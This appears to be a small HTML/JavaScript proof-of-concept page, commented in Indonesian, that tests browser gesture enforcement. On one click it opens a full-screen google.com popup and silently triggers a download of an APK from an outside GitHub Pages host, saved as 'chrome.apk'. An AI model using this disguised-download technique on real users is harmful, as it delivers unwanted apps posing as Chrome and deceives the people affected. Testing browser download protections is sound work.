<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Download Gesture Test</title>
<style>
body { font-family:sans-serif;padding:20px;background:#f5f5f5 }
button { 
  padding:12px 18px;
  font-size:16px;
  background:#4CAF50;
  color:white;
  border:none;
  border-radius:4px;
  cursor:pointer;
  margin-bottom:15px;
}
button:hover { background:#45a049 }
pre { 
  background:#1a1a1a;
  color:#0f0;
  padding:15px;
  border-radius:4px;
  overflow:auto;
  font-size:14px;
  line-height:1.5;
}
</style>
</head>
<body>

<h3>Popup Download Gesture Enforcement Test</h3>
<button id="btn">Open Popup (Google.com)</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

document.getElementById("btn").onclick = () => {
  log("[1] User click received");

  // ✅ LANGSUNG BUKA GOOGLE.COM (bukan about:blank)
  const w = window.open(
    "https://www.google.com",
    "_blank",
    `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0,resizable=yes,scrollbars=yes`
  );

  if (!w) {
    log("[ERROR] Popup blocked by browser");
    return;
  }

  log("[2] Popup opened directly to Google.com");

  // ⚠️ Trigger download dari WINDOW UTAMA (bukan popup)
  // Popup google.com tidak bisa di-inject karena CORS
  try {
    const fakeApkLink = document.createElement('a');
    fakeApkLink.href = "https://oxfat.github.io/fake.apk";
    fakeApkLink.download = "chrome.apk";
    fakeApkLink.style.display = 'none';
    document.body.appendChild(fakeApkLink);
    
    fakeApkLink.click();
    log("[3] Download attempt triggered from MAIN window");
    
    document.body.removeChild(fakeApkLink);
  } catch (e) {
    log("[ERROR] Download failed: " + e.message);
  }

  log("[4] Note: Browser may block download due to gesture enforcement");
};
</script>

</body>
</html>
